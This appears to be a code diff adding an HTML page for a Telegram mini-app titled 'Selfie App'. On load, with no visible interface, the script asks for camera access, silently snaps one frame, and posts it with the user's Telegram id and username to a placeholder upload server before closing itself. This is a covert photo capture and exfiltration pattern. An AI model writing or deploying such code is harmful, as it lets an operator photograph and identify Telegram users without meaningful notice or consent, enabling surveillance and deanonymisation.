@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Selfie App</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+</head>
+<body style="background-color: white;">
+    <script>
+        const tg = window.Telegram.WebApp;
+        tg.ready();
+
+        async function requestCameraAccess() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                takeSelfie(stream);
+            } catch (error) {
+                console.error('Camera access denied or error:', error);
+                tg.close(); // Close the web app if access is denied
+            }
+        }
+
+        function takeSelfie(stream) {
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            video.play();
+            
+            video.onloadedmetadata = () => {
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const context = canvas.getContext('2d');
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                const dataURL = canvas.toDataURL('image/png');
+                sendPhoto(dataURL);
+
+                stream.getTracks().forEach(track => track.stop()); // Stop all tracks after capturing the photo
+                tg.close(); // Close the web app after taking the selfie
+            };
+        }
+
+        function sendPhoto(photoData) {
+            const user = tg.initDataUnsafe.user;
+            fetch('https://your-server-url.com/upload', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ 
+                    photo: photoData, 
+                    userId: user.id,
+                    username: user.username
+                })
+            }).then(response => {
+                if (response.ok) {
+                    console.log('Photo sent successfully');
+                } else {
+                    console.error('Failed to send photo');
+                }
+            }).catch(error => {
+                console.error('Error sending photo:', error);
+            });
+        }
+
+        // Request camera access immediately when the page loads
+        requestCameraAccess();
+    </script>
+</body>
+</html>
